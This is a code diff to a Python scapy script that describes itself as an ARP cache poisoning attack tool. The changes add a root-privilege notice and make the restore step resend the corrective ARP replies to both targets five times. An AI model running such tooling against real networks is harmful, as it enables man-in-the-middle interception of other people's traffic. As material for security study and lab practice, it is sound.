@@ -2,6 +2,7 @@
 
 '''
 This script is for ARP cache poisoning attack
+note : You have to run this script with root privileges
 note : You should have enabled ip forwarding on your machine
 author = 'xenon-xenon'
 author_github = 'https://github.com/xenon-xenon'
@@ -111,16 +112,28 @@ class ArpSpoof:
         '''restore arp tables of the target machines'''
 
         print('\n')
-        print('Send 2 last ARP packets for restore targets arp tables')
-        correct_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac, hwsrc=self.target1_mac) # restore mac table of target 2
-        correct_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac, hwsrc=self.target2_mac) # restore mac table of target 1
+        print('[Send last 2 ARP packets for restoring targets ARP tables] --> 5 times')
+        arp_restore_packets = 5 # for sending 2 packets 5 times -> 2*5
+        num = 0
+        try:
+            while arp_restore_packets != num :
+                num += 1
+                correct_arp_packet_target1 = ARP(op=2, psrc=self.target1_ip, pdst=self.target2_ip, hwdst=self.target2_mac, hwsrc=self.target1_mac) # restore mac table of target 2
+                correct_arp_packet_target2 = ARP(op=2, psrc=self.target2_ip, pdst=self.target1_ip, hwdst=self.target1_mac, hwsrc=self.target2_mac) # restore mac table of target 1
 
-        send(correct_arp_packet_target1 ,verbose=0)
-        send(correct_arp_packet_target2 ,verbose=0)
+                send(correct_arp_packet_target1 ,verbose=0)
+                send(correct_arp_packet_target2 ,verbose=0)
+        except:
+            print('ARP cache restore failed !')
+            exit()
+        else:
+            print('The attack has finished.')
+            exit()
 
 
 if __name__ == '__main__' :
-    print('\n***You should have enabled ip forwarding on your machine***\n')
+    print('\n***You have to run this script with root privileges***')
+    print('***You should have enabled ip forwarding on your machine***\n')
     # define parser and its arguments
     parser = ArgumentParser()
     parser.add_argument('--interface','-i',help='interface using in attack')
